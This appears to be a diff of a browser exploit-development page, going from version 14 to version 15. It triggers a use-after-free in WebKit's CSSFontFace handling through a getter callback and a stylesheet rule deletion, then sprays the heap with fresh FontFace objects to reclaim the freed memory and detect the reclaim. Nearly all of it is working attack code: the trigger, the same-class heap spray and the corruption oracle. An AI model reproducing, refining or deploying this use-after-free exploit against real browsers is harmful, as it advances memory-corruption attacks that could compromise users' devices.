@@ -2,67 +2,53 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>P2 v14</title>
+<title>P2 v15</title>
 <style>body{font-size:28px;font-family:sans-serif;background:#111;color:#0f0}pre{white-space:pre-wrap;font-size:22px}</style>
 <style id="s0">@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }</style>
-<style id="spraycss"></style>
 </head>
 <body>
 <h3 id="st">stage A</h3>
 <pre id="out"></pre>
 <script>
-// Phase 2 v10: WEBCORE-shaped spray. If 14.23 moved JS ArrayBuffer stores to
-// a separate heap, CSS strings (StringImpl, same fastMalloc/bmalloc as the
-// freed CSSFontFace) can still reclaim the chunk. Marker oracle: 200 unique
-// ~192B font-family names; corruption readable back via the CSSOM.
+// Phase 2 v15: SAME-CLASS spray. Fresh FontFace objects allocate the exact
+// CSSFontFace C++ class from the same allocator as the freed chunk. Oracle is
+// behavioral: stale engine pointers landing on a controlled face show up as
+// anomalous face statuses / the hung load resolving or corrupting.
 function log(s) { document.getElementById('out').textContent += s + "\n"; }
 
-log('PAGE VERSION: v14 (no-delete + CSS strings) (CSS spray + sanity control)');
+log('PAGE VERSION: v15 (same-class FontFace spray)');
 log('UA = ' + navigator.userAgent);
 
-var NRULES = 200, NAMELEN = 176;      // StringImpl hdr ~16 + 176 chars ~= 192B
-var names = [];
+var NFS = 150, faces = [];
 
-function makeName(r) {
-  var tag = ('f' + r);
-  while (tag.length < 6) tag = '0' + tag;
-  var s = tag;
-  while (s.length < NAMELEN) s += String.fromCharCode(97 + (r % 26));
-  return s;
-}
-
-function cssSpray() {
-  var css = '';
-  for (var r = 0; r < NRULES; r++) {
-    names[r] = makeName(r);
-    css += '@font-face{font-family:"' + names[r] + '";src:local(NoFont);}';
+function faceSpray() {
+  for (var i = 0; i < NFS; i++) {
+    var f = new FontFace('z' + i, 'local(Helvetica)', {});
+    document.fonts.add(f);            // allocates the backing CSSFontFace
+    faces.push(f);
   }
-  document.getElementById('spraycss').textContent = css;
 }
 
-function scanCss(tag) {
-  var hits = 0;
+function scanFaces(tag) {
+  var bad = 0, loaded = 0, unloaded = 0, err = 0;
   try {
-    var rules = document.getElementById('spraycss').sheet.cssRules;
-    for (var i = 0; i < rules.length; i++) {
-      var txt = rules[i].cssText;
-      if (i === 0 && tag === 'sanity-pre-drive')
-        log('sample cssText: ' + txt.slice(0, 80));
-      if (txt.indexOf(names[i]) === -1) {
-        hits++;
-        log('rule ' + i + ' CORRUPTED: ' + txt.slice(0, 60));
-      }
+    for (var i = 0; i < NFS; i++) {
+      var s = faces[i].status;
+      if (s === 'loaded') loaded++;
+      else if (s === 'unloaded') unloaded++;
+      else if (s === 'error') err++;
+      else { bad++; if (bad < 4) log('face ' + i + ' WEIRD status: ' + s); }
     }
   } catch (e) { log('scan threw: ' + e); }
-  log('scan(' + tag + '): ' + hits + ' of ' + NRULES + ' rules corrupted');
-  if (hits) log('WEBCORE RECLAIM CONFIRMED - freed chunk is CSS-string backed');
-  return hits;
+  log('scan(' + tag + '): loaded=' + loaded + ' unloaded=' + unloaded +
+      ' error=' + err + ' weird=' + bad + ' fonts.status=' + document.fonts.status);
+  if (bad > 0) log('SAME-CLASS RECLAIM SIGNAL - anomalous face statuses');
 }
 
 function trigger() {
   log('stage B: trigger in 3s');
   setTimeout(function () {
-    log('triggering + CSS string spray');
+    log('triggering + FontFace spray');
 
     var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
@@ -74,22 +60,12 @@ function trigger() {
       get: function () {
         fired++;
         if (this === A && fired === 1) {
-          log('GETTER FIRED - free + CSS spray');
+          log('GETTER FIRED - free + same-class spray');
           try { document.getElementById('s0').sheet.deleteRule(0); } catch (e) {}
-          // v14: NO fonts.delete - keep the Phase 1 shape where the engine
-          // provably touches the freed face (promise hangs)
           document.body.offsetTop;               // force recalc -> FREE
-          cssSpray();                            // 200 x ~192B WebCore strings
-          // CONTROL: scan BEFORE the engine drive - if the oracle itself is
-          // broken (CSSOM re-parse artifact) this shows corrupted already
-          scanCss('sanity-pre-drive');
-          var st = document.createElement('style');
-          st.textContent = '@font-face { font-family: x; src: local(Helvetica Narrow); unicode-range: U+0043; }';
-          document.head.appendChild(st);
-          document.body.offsetTop;
+          faceSpray();                           // 150 fresh CSSFontFace-class objects
+          document.body.offsetTop;               // recalc through the new faces
           document.fonts.check('1em x', 'A');
-          document.fonts.check('1em x', 'ABC');
-          log('fonts.status after drive: ' + document.fonts.status);
         }
         return undefined;
       }
@@ -97,25 +73,20 @@ function trigger() {
 
     try {
       document.fonts.load('1em x', 'AB').then(
-        function (f) { log('load resolved ' + (f ? f.length : '?')); },
+        function (f) {
+          log('load RESOLVED with ' + (f ? f.length : '?') + ' faces' +
+              ' - stale pointer may have landed on a sprayed face');
+          for (var i = 0; f && i < f.length; i++)
+            log('  reported face: ' + (f[i] && f[i].family) +
+                ' status=' + (f[i] && f[i].status));
+        },
         function (e) { log('load rejected: ' + e); });
     } catch (e) { log('load threw: ' + e); }
 
-    setTimeout(function () { scanCss('2s'); }, 2000);
-    setTimeout(function () { scanCss('6s'); }, 6000);
+    setTimeout(function () { scanFaces('2s'); }, 2000);
+    setTimeout(function () { scanFaces('6s'); }, 6000);
   }, 3000);
 }
-
-// ORACLE SELF-TEST at load - never spend a console run on a broken oracle
-cssSpray();
-(function () {
-  try {
-    var r0 = document.getElementById('spraycss').sheet.cssRules[0];
-    var t = r0 ? r0.cssText : '(no rule)';
-    log('oracle self-test: ' + (t.indexOf(names[0]) !== -1 ? 'PASS' : 'FAIL') +
-        ' cssText[0]=' + t.slice(0, 90));
-  } catch (e) { log('oracle self-test threw: ' + e); }
-})();
 
 log('armed');
 window.onload = trigger;
